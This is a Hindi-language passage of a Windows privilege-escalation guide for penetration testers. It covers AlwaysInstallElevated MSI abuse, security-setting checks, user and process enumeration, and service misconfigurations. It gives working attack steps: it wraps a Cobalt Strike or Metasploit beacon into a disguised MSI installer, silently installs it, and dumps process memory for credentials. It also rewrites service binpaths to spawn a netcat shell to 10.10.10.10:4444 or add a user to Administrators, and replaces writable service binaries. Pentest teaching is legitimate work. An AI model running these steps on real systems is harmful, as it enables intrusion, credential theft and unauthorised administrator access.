इस tools का उपयोग करके MSI wrapper बनाने का तरीका जानने के लिए यह tutorial पढ़ें। ध्यान दें कि अगर आप **सिर्फ** **command lines** **execute** करना चाहते हैं, तो आप "**.bat**" फ़ाइल को wrap कर सकते हैं।

{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike या Metasploit से एक **नया Windows EXE TCP payload** `C:\privesc\beacon.exe` में **Generate** करें।
- **Visual Studio** खोलें, **Create a new project** चुनें और search box में "installer" टाइप करें। **Setup Wizard** project चुनें और **Next** पर क्लिक करें।
- Project को कोई नाम दें, जैसे **AlwaysPrivesc**; location के लिए **`C:\privesc`** इस्तेमाल करें; **place solution and project in the same directory** चुनें और **Create** पर क्लिक करें।
- Step 3 of 4 (शामिल करने के लिए files चुनें) तक पहुँचने तक **Next** पर क्लिक करते रहें। **Add** पर क्लिक करें और अभी-अभी बनाया गया Beacon payload चुनें। फिर **Finish** पर क्लिक करें।
- **Solution Explorer** में **AlwaysPrivesc** project को चुनें और **Properties** में **TargetPlatform** को **x86** से **x64** में बदलें।
  - आप अन्य properties भी बदल सकते हैं, जैसे **Author** और **Manufacturer**, जिससे installed app अधिक वैध दिख सकती है।
- Project पर right-click करें और **View > Custom Actions** चुनें।
- **Install** पर right-click करें और **Add Custom Action** चुनें।
- **Application Folder** पर double-click करें, अपनी **beacon.exe** file चुनें और **OK** पर क्लिक करें। इससे यह सुनिश्चित होगा कि installer चलते ही beacon payload execute हो जाए।
- **Custom Action Properties** के अंतर्गत, **Run64Bit** को **True** में बदलें।
- अंत में, इसे **build करें**।
  - अगर चेतावनी `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखाई दे, तो सुनिश्चित करें कि आपने platform को x64 पर सेट किया है।

### MSI Installation

दुर्भावनापूर्ण `.msi` file का **installation** **background** में execute करने के लिए:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

इस vulnerability का exploit करने के लिए आप इसका उपयोग कर सकते हैं: _exploit/windows/local/always_install_elevated_

## Antivirus और Detectors

### Audit Settings

ये settings तय करती हैं कि क्या **लॉग** किया जा रहा है, इसलिए आपको इस पर ध्यान देना चाहिए.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding में यह जानना दिलचस्प है कि लॉग कहाँ भेजे जाते हैं।

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** को **स्थानीय Administrator पासवर्ड के प्रबंधन** के लिए डिज़ाइन किया गया है। यह सुनिश्चित करता है कि डोमेन से जुड़े कंप्यूटरों पर हर पासवर्ड **अद्वितीय, रैंडम और नियमित रूप से अपडेट** हो। ये पासवर्ड Active Directory में सुरक्षित रूप से संग्रहीत होते हैं और केवल वे उपयोगकर्ता ही इन्हें एक्सेस कर सकते हैं जिन्हें ACLs के ज़रिए पर्याप्त अनुमतियाँ दी गई हों। इससे वे अधिकृत होने पर स्थानीय admin पासवर्ड देख सकते हैं।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

सक्रिय होने पर, **सादे टेक्स्ट वाले पासवर्ड LSASS** (Local Security Authority Subsystem Service) में संग्रहीत होते हैं।\
[**इस पेज पर WDigest के बारे में अधिक जानकारी**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** से शुरू होकर, Microsoft ने Local Security Authority (LSA) के लिए बेहतर सुरक्षा शुरू की, ताकि सिस्टम को और सुरक्षित करते हुए अविश्वसनीय प्रक्रियाओं के **उसकी मेमोरी पढ़ने** या उसमें कोड inject करने के प्रयासों को **रोका** जा सके।\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** को **Windows 10** में पेश किया गया था। इसका उद्देश्य किसी डिवाइस पर संग्रहीत credentials को pass-the-hash attacks जैसे खतरों से सुरक्षित रखना है। [**Credential Guard के बारे में अधिक जानकारी यहाँ उपलब्ध है।**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Cached Credentials

**Domain credentials** को **Local Security Authority** (LSA) द्वारा authenticate किया जाता है और operating system के components इनका उपयोग करते हैं। जब किसी user के logon data को registered security package द्वारा authenticate किया जाता है, तो आम तौर पर उस user के लिए domain credentials स्थापित हो जाते हैं।\
[**Cached Credentials के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## उपयोगकर्ता और समूह

### उपयोगकर्ताओं और समूहों की गणना करें

आपको जाँचना चाहिए कि जिन समूहों के आप सदस्य हैं, उनमें से किसी के पास दिलचस्प अनुमतियाँ हैं या नहीं।

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### विशेषाधिकार प्राप्त समूह

यदि आप **किसी विशेषाधिकार प्राप्त समूह के सदस्य हैं, तो आप विशेषाधिकार बढ़ाने में सक्षम हो सकते हैं**। विशेषाधिकार प्राप्त समूहों और विशेषाधिकार बढ़ाने के लिए उनका दुरुपयोग करने के तरीकों के बारे में यहाँ जानें:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

इस पेज पर **token** क्या है, इसके बारे में **और जानें**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)।\
दिलचस्प tokens के बारे में जानने और उनका दुरुपयोग करने के तरीके जानने के लिए अगला पेज देखें:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### लॉग इन किए हुए उपयोगकर्ता / Sessions

```bash
qwinsta
klist sessions
```

### होम फ़ोल्डर

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### पासवर्ड नीति

```bash
net accounts
```

### क्लिपबोर्ड की सामग्री प्राप्त करें

```bash
powershell -command "Get-Clipboard"
```

## चल रही प्रक्रियाएँ

### फ़ाइल और फ़ोल्डर की अनुमतियाँ

सबसे पहले, प्रक्रियाओं की सूची बनाते समय **प्रक्रिया की command line में पासवर्ड खोजें**।\
जाँचें कि क्या आप **चल रहे किसी binary को overwrite कर सकते हैं**, या संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) का फायदा उठाने के लिए binary फ़ोल्डर में आपके पास write permissions हैं:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

हमेशा चल रहे [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) की जाँच करें; privileges escalate करने के लिए उनका दुरुपयोग किया जा सकता है।

Debugger listener थोड़े समय के लिए चल सकता है, इसलिए एक passive port snapshot में उसका न दिखना यह साबित नहीं करता कि वह कभी expose नहीं हुआ था। किसी भी दिखे listener को उसके PID, process owner और उस तक कम privileges वाले user की पहुँच की क्षमता से मिलाकर जाँचें; केवल application का नाम या debug flag, cross-user code execution साबित नहीं करता। Routine enumeration को passive रखें और debugger commands न भेजें।

**Processes के binaries की permissions जाँचना**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**प्रोसेस की बाइनरीज़ वाले फ़ोल्डरों की अनुमतियाँ जाँचना (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor directories

Snort 2, configuration में घोषित `dynamicpreprocessor directory` से shared libraries लोड कर सकता है; यह configuration `snort.exe -c <config>` से चुनी जाती है। यदि कोई scheduled task या service Snort को किसी दूसरे account के तहत चलाती है, तो उसी configuration और घोषित module directory के ACL की जाँच करें। यदि आपका token वहाँ files बना सकता है, तो अगली बार उस task या service द्वारा modules लोड किए जाने पर code execution की समीक्षा के लिए यह path एक उम्मीदवार है। run-as account के प्रभावी privileges, सक्रिय configuration, module compatibility, और किसी भी deny या share restrictions की पुष्टि करें; केवल writable directory से privilege escalation साबित नहीं होती। [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) runtime module loading का वर्णन करती है।

### writable document root वाली privileged web service

Windows Apache installation में service के executable path और run-as account की तुलना उसके सक्रिय `httpd.conf` में मौजूद `DocumentRoot` से करें। सामान्य XAMPP layout के लिए, `C:\xampp\apache\conf\httpd.conf` और उसके configured document root के ACL की जाँच करें, जो अक्सर `C:\xampp\htdocs` होता है। यदि कम privilege वाला user उस root में files बना सकता है और Apache `LocalSystem` के रूप में चलता है, तो server-side code execution host privilege boundary पार कर सकता है। पुष्टि करें कि service चल रही है, वही exact path serve किया जा रहा है, और server-side handler उस file type को process करता है; केवल writable root से सिर्फ file creation साबित होती है। कोई probe लिखे बिना ACL की जाँच करें:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

एक पारंपरिक WAMP installation में, service किसी versioned `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (या 32-bit layout के लिए `C:\wamp\...`) की ओर संकेत कर सकती है। इसकी configuration पास में `conf\httpd.conf` में और default root `C:\wamp64\www` या `C:\wamp\www` में होती है। सटीक service image, उसका run-as identity, प्रभावी `DocumentRoot` (जिसमें `${INSTALL_DIR}` का विस्तार और virtual-host overrides शामिल हैं) और root ACL एक साथ जांचें। WAMP directory का writable होना यह साबित नहीं करता कि Apache `SYSTEM` के रूप में चलता है या भेजी गई file execute करता है। [Apache documents how a Windows service selects its configuration](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Writable IIS root और application-pool network identity

IIS के लिए, `applicationHost.config` में किसी writable physical directory को **active site/application** से map करें, फिर उसका configured pool और server-side handler पहचानें। Served directory में रखी गई code तभी pool के रूप में चलती है, जब IIS उस file type को process करे और route तक पहुंचा जा सके। Writable directory को code execution मानने से पहले, मौजूदा user की प्रभावी create-file access, site की runtime state, handler और per-path overrides जांचें।

ASP.NET की dynamic compilation की जांच के लिए एक अलग path है: application की compilation directory में बनाई गई files। Default रूप से यह संबंधित .NET Framework installation के अंतर्गत `Temporary ASP.NET Files` directory होती है, लेकिन application का `<compilation tempDirectory>` इसे बदल सकता है। [Microsoft documents the location and per-application subdirectories](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) और [recommends isolating compilation directories when application pools do not trust each other](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). अगर कम privileges वाला token **विशिष्ट** application के cache में generated source बदल सकता है, तो पता करें कि क्या वह application इसे अधिक privileged [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) के तहत फिर से compile करती है। केवल file या directory ACL से code execution साबित नहीं होता: cache को active application, प्रभावी token और ACL, compilation settings, process identity और किसी भी recompile के समय के साथ मिलाकर जांचें। केवल read-only metadata की समीक्षा करें; enumeration के दौरान compilation trigger न करें और cache files न बदलें।

`ApplicationPoolIdentity` या `NetworkService` के रूप में configured IIS pool अक्सर domain resources के लिए **host computer account** के रूप में authenticate करता है, भले ही उसका local token कम privileges वाला हो। `LocalSystem` स्थानीय स्तर पर पहले से ही अत्यधिक privileged है और network पर भी computer account का उपयोग करता है; `LocalService` आम तौर पर anonymous network credentials प्रस्तुत करता है। `SpecificUser` pool इसके बजाय अपना configured account उपयोग करता है। [Microsoft documents these identity types](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) और [the application-pool network identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). छोड़ी गई identity setting pool defaults से inherit हो सकती है, जो IIS generations के अनुसार अलग-अलग होते हैं; इसलिए pool name से अनुमान लगाने के बजाय प्रभावी configuration पता करें। अगर code execution ऐसे pool तक पहुंचती है जिसकी network identity computer account है, तो उस **विशिष्ट computer** के directory rights का आकलन करें। [DCSync](../active-directory-methodology/dcsync.md) के लिए domain naming context पर replication rights चाहिए; machine-account ticket या host role अकेले इन्हें साबित नहीं करते। Passive enumeration में configuration और ACL की जांच करें—file upload किए बिना, network authentication किए बिना और tickets मांगे बिना।

ऐसे readable ASP.NET handler के लिए जो helper process शुरू करता है, request से आए किसी भी value को authentication, decryption, validation और command construction के दौरान trace करें। ऐसा handler जो decoded token को `ProcessStartInfo("cmd", "/c ...")` में जोड़ता है, shell metacharacters को command बदलने दे सकता है; [Microsoft documents `cmd`'s special characters](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). पहले पुष्टि करें कि कोई untrusted caller वास्तव में decoded value को प्रभावित कर सकता है और handler तक पहुंच सकता है; फिर प्रभावी application-pool या impersonated identity और child process की identity पता करें। केवल readable source line, localhost listener या token-format कमजोरी से privileged command execution साबित नहीं होता। Passive enumeration के दौरान forged requests भेजे बिना या helper चलाए बिना source और pool configuration की समीक्षा करें।

Windows पर PHP service के लिए, request-controlled path जिसे [`include` या `require`](https://www.php.net/manual/en/function.include.php) में दिया जाता है, lower-user-writable PHP file को worker की identity के तहत evaluate कर सकता है। पुष्टि करें कि request उस statement तक पहुंच सकती है, resolved path ऐसी file को दर्शाता है जिसे lower user बदल सकता है और worker पढ़ सकता है, लागू PHP path restrictions include की अनुमति देते हैं, और worker वास्तव में higher privileges के साथ चलता है। केवल loopback listener या writable file से यह chain साबित नहीं होती; passive enumeration के दौरान endpoint invoke किए बिना source, service identity और file ACL की जांच करें।

### मेमोरी में पासवर्ड की खोज

आप sysinternals के **procdump** का उपयोग करके चल रही process का memory dump बना सकते हैं। FTP जैसी services के credentials अक्सर **memory में clear text में होते हैं**; memory dump करके credentials पढ़ने की कोशिश करें।

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### असुरक्षित GUI ऐप्स

**SYSTEM के रूप में चलने वाले ऐप्लिकेशन किसी उपयोगकर्ता को CMD खोलने या डायरेक्टरी ब्राउज़ करने दे सकते हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), "command prompt" खोजें, फिर "Click to open Command Prompt" पर क्लिक करें।

### विशेषाधिकार-युक्त project-file import

कोई ऐप्लिकेशन जो निचले-विशेषाधिकार वाले उपयोगकर्ता द्वारा लिखे जा सकने वाले drop directory से projects अपने-आप खोलता है, importer के खाते के अंतर्गत एक input trust boundary पार करता है। **सटीक writable path**, उसे खोलने वाली process या task, उसकी effective identity और parser build की समीक्षा करें। [ऐतिहासिक Ghidra project open/restore समस्या](https://github.com/NationalSecurityAgency/ghidra/issues/71) में project metadata में XML external entities का उपयोग संभव था; यदि [outbound SMB और NTLM policy](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) इसकी अनुमति दें, तो Windows पर network entity से importing account के credentials उजागर हो सकते थे। यह credentials के उजागर होने का संकेत है, तुरंत administrator access मिलने का प्रमाण नहीं: उस response का उपयोग किसी अलग अधिकृत या vulnerable path से संभव होना चाहिए, और मौजूदा builds का आकलन उनकी वास्तविक patch स्थिति के आधार पर होना चाहिए। Passive enumeration के दौरान तैयार किया गया project न खोलें; import workflow और ACLs की जाँच करें।

## Services

Service Control Manager (SCM) object का [`SC_MANAGER_CREATE_SERVICE` अधिकार](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), किसी मौजूदा service के अधिकारों से अलग है। इस अधिकार के लिए सफल read-only [`OpenSCManager` access request](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) जाँच का एक संकेत है, इस बात का प्रमाण नहीं कि नई service चल सकती है। [`CreateService` एक handle लौटाता है](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew), जिसमें creation के समय अनुरोधित service access होता है; बाद में service को दोबारा खोलने पर अलग access check होता है, और वह असफल हो सकता है, भले ही मूल handle का उपयोग संभव हो। Effective local या remote token, granted handle rights, service account, start policy और executable path की अलग-अलग पुष्टि करें। Passive enumeration के दौरान service न बनाएँ और न शुरू करें।

Remote service-install path के लिए, उन SCM अधिकारों का target पर ऐसे share से मिलान करें जिसमें **वही network logon** लिख सके, साथ ही उसके underlying NTFS ACL और ऐसे local executable path की जाँच करें जिसे service account चला सके। यदि असामान्य रूप से व्यापक SCM अधिकार और file-placement path—दोनों मौजूद हों, तो non-admin account यह boundary पार कर सकता है; administrative share अनिवार्य शर्त नहीं है। केवल share में write access या केवल SCM create-service का संकेत यह साबित नहीं करता कि नई service उच्चतर identity के अंतर्गत शुरू हो सकती है।

मौजूदा service startup, shutdown या किसी अन्य lifecycle event पर helper executable चला सकती है, भले ही वह helper उसके `ImagePath` में न हो। यदि helper name किसी निचले-विशेषाधिकार वाले उपयोगकर्ता द्वारा लिखी जा सकने वाली directory में resolve होता है और service उच्चतर identity के अंतर्गत चलती है, तो अनुपस्थित helper file को शर्तों के अधीन बदला जा सकने वाला candidate माना जा सकता है। **वास्तविक service code या दस्तावेज़ित helper invocation**, resolved executable path और search order, directory बनाने के अधिकार, service identity और उपलब्ध lifecycle trigger की पुष्टि करें। केवल writable service directory या अनुपस्थित file से यह साबित नहीं होता कि service उस file को load करती है; passive review में service को शुरू या बंद न करें।

मौजूदा service के लिए, [`SERVICE_START` से `StartService` को arguments दिए जा सकते हैं](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); यह [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) से अलग है। Start access को केवल control right से अधिक मानने से पहले service के code या दस्तावेज़ित interface की समीक्षा करें। यदि वह caller द्वारा चुने गए argument को log या export path के रूप में उपयोग करती है, तो service identity, argument से write तक का सटीक flow, path restrictions और **बनाई गई file** की permissions की पुष्टि करें। Protected directory में write करना तभी escalation बन सकता है, जब कोई अलग privileged consumer या loader उस file को स्वीकार करे; केवल writable log या start right पर्याप्त नहीं है। Passive inventory के दौरान service शुरू न करें और test file न बनाएँ।

NSClient++ monitoring agent के लिए, पढ़ी जा सकने वाली `nsclient.ini` एक **configuration review lead** है: उसमें web credentials हो सकते हैं, जबकि `boot.ini` configuration को किसी अन्य स्थान पर redirect कर सकती है। वास्तविक service account, WEB listener और access policy की जाँच करें; साथ ही पुष्टि करें कि authenticated role settings या scripts बदल सकता है या नहीं। Privileged execution के लिए इसके अलावा `CheckExternalScripts` (या कोई अन्य enabled execution path), command register या modify करने का प्रभावी अधिकार और ऐसा trigger आवश्यक है जो उसे service identity के अंतर्गत चलाए। केवल loopback-only listener भी local user के लिए पहुँच योग्य हो सकता है, लेकिन केवल file path, password या listener से उन अधिकारों की पुष्टि नहीं होती। Passive enumeration के दौरान secrets दिखाए बिना या web API invoke किए बिना metadata और permissions की समीक्षा करें। देखें [NSClient++ file layout](https://nsclient.org/docs/concepts/file-layout/), [web और script security guidance](https://nsclient.org/docs/setup/securing/), और [external-script configuration](https://nsclient.org/docs/reference/check/CheckExternalScripts/)।

जिस service का `ImagePath` `nssm.exe` है, उसके लिए service के वास्तविक run-as account और उसके `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` value की जाँच करें: [NSSM child application को वहाँ रखता है](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), जबकि `AppDirectory` उसका configured working directory है। Wrapper की permissions को पूरी service boundary मानने से पहले child executable और उसकी parent-directory ACLs जाँचें। उस child द्वारा expose किया गया local WCF या SOAP endpoint जाँच का एक अलग संकेत है: पुष्टि करें कि निचले-विशेषाधिकार वाला उपयोगकर्ता listener तक पहुँच सकता है, सटीक operation उसका input स्वीकार करता है, और service child उस unsafe operation को उच्चतर identity के अंतर्गत चलाता है। केवल service account, endpoint URL या writable path से escalation साबित नहीं होती; passive enumeration के दौरान service operations invoke न करें।

Custom WCF operation के लिए, caller द्वारा नियंत्रित string को किसी भी PowerShell runspace तक trace करें। [`Pipeline.Commands.AddScript` script text जोड़ता है](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), और [`Pipeline.Invoke` pipeline चलाता है](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke)। [`Windows transport credentials वाला `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) client को authenticate करता है, लेकिन उस **विशिष्ट** operation को call करने की authorization और runspace की effective identity अलग से जाँचनी होगी। निचले-विशेषाधिकार वाले caller के input से उच्चतर service identity के अंतर्गत `AddScript` तक जाने वाला path code-execution boundary है; केवल listening port, authenticated client या किसी असंबंधित assembly में unused method इसका प्रमाण नहीं है। Enumeration के दौरान endpoint invoke किए बिना deployed service, contract, authorization और impersonation settings की static review करें।

Service Triggers कुछ शर्तें होने पर Windows को service शुरू करने देते हैं (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh आदि)। SERVICE_START अधिकार न होने पर भी, आप अक्सर triggers सक्रिय करके privileged services शुरू कर सकते हैं। Enumeration और activation techniques यहाँ देखें:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio diagnostic collector service

C/C++ tooling वाले Visual Studio installations में `VSStandardCollectorService150` शामिल हो सकती है; यह diagnostic service `LocalSystem` के रूप में चलने के लिए configured होती है। [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) में service DACL reset को redirect करने के लिए junction और object-manager-link race का उपयोग किया गया था। प्रदर्शित escalation के लिए उपयोग करने योग्य Visual Studio Setup WMI Provider MSI repair path और उसका `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` target भी आवश्यक था। यह component जनवरी 2024 में fix किया गया था।

Passive triage के लिए, उस एक service का account और binary path जाँचें, देखें कि Setup WMI compiler path मौजूद है या नहीं, और installed component की patch स्थिति की पुष्टि करें। केवल service entry, Visual Studio product version या compiler file से यह साबित नहीं होता कि host vulnerable है। जाँच के लिए service शुरू करने या repair चलाने की आवश्यकता नहीं है।

Services की सूची प्राप्त करें:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### अनुमतियाँ

आप किसी service की जानकारी प्राप्त करने के लिए **sc** का उपयोग कर सकते हैं.

```bash
sc qc <service_name>
```

हर service के लिए आवश्यक privilege level जाँचने हेतु _Sysinternals_ का binary **accesschk** उपलब्ध रखने की सिफारिश की जाती है।

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

यह जांचने की सिफारिश की जाती है कि क्या "Authenticated Users" किसी सेवा को संशोधित कर सकते हैं:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[आप XP के लिए accesschk.exe यहाँ से डाउनलोड कर सकते हैं](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Service सक्षम करें

अगर आपको यह त्रुटि मिल रही है (उदाहरण के लिए SSDPSRV के साथ):

_System error 1058 हुआ है._\
_सेवा शुरू नहीं की जा सकती, क्योंकि यह disabled है या इससे जुड़ा कोई enabled device नहीं है।_

आप इसे इस तरह सक्षम कर सकते हैं:

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**ध्यान रखें कि service upnphost को काम करने के लिए SSDPSRV पर निर्भर रहना पड़ता है (XP SP1 के लिए)**

**इस समस्या का एक और workaround** चलाना है:

```
sc.exe config usosvc start= auto
```

### **service binary path में बदलाव करें**

जिस स्थिति में "Authenticated users" समूह के पास किसी service पर **SERVICE_ALL_ACCESS** हो, उसमें service की executable binary को बदलना संभव है। **sc** को बदलने और execute करने के लिए:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### सेवा पुनः आरंभ करें

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

विभिन्न permissions के ज़रिए privileges को escalate किया जा सकता है:

- **SERVICE_CHANGE_CONFIG**: Service binary को reconfigure करने की अनुमति देता है।
- **WRITE_DAC**: Permissions को reconfigure करने में सक्षम बनाता है, जिससे service configurations बदलना संभव होता है।
- **WRITE_OWNER**: Ownership हासिल करने और permissions को reconfigure करने की अनुमति देता है।
- **GENERIC_WRITE**: Service configurations बदलने की क्षमता विरासत में देता है।
- **GENERIC_ALL**: Service configurations बदलने की क्षमता विरासत में देता है।

इस vulnerability का पता लगाने और exploit करने के लिए _exploit/windows/local/service_permissions_ का उपयोग किया जा सकता है।

### Services binaries की कमजोर permissions

अगर कोई service **`LocalSystem`**, **`LocalService`**, **`NetworkService`**, या किसी privileged domain account के रूप में चलती है, लेकिन **कम privileges वाले users service EXE या उसके parent folder को modify कर सकते हैं**, तो अक्सर **binary को replace करके और service को restart करके** उसे hijack किया जा सकता है।

**जांचें कि क्या आप किसी service द्वारा execute की जाने वाली binary को modify कर सकते हैं**, या उस **folder पर write permissions हैं** जहाँ binary मौजूद है ([**DLL Hijacking**](dll-hijacking/index.html))**।**\
**wmic** (system32 में नहीं) का उपयोग करके service द्वारा execute की जाने वाली हर binary प्राप्त कर सकते हैं और **icacls** का उपयोग करके अपनी permissions जांच सकते हैं:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

आप **sc** और **icacls** का भी उपयोग कर सकते हैं:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

सेवा executable या उसे रखने वाली directory पर **`Everyone`**, **`BUILTIN\Users`**, या **`Authenticated Users`** को दिए गए खतरनाक ACLs देखें, खासकर **`(F)`**, **`(M)`**, या **`(W)`**। इसका व्यावहारिक दुरुपयोग इस तरह किया जा सकता है:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` से service account और executable path की पुष्टि करें।
2. `icacls <path>` से पुष्टि करें कि binary writable है।
3. Service binary को payload या किसी valid malicious service binary से बदलें।
4. `sc stop <service_name> && sc start <service_name>` से service restart करें (या reboot / service trigger का इंतज़ार करें)।

उपयोगी automated checks:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> यदि सेवा किसी सामान्य उपयोगकर्ता को उसे restart करने की अनुमति नहीं देती, तो जाँचें कि क्या वह boot पर अपने-आप शुरू होती है, उसमें relaunch करने वाली failure action है, या उसका उपयोग करने वाले application के ज़रिए उसे अप्रत्यक्ष रूप से trigger किया जा सकता है।

### सेवाओं की registry में बदलाव की अनुमतियाँ

आपको जाँचना चाहिए कि क्या आप किसी service registry में बदलाव कर सकते हैं।\
आप किसी service **registry** पर अपनी **permissions** इस तरह **जाँच** सकते हैं:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

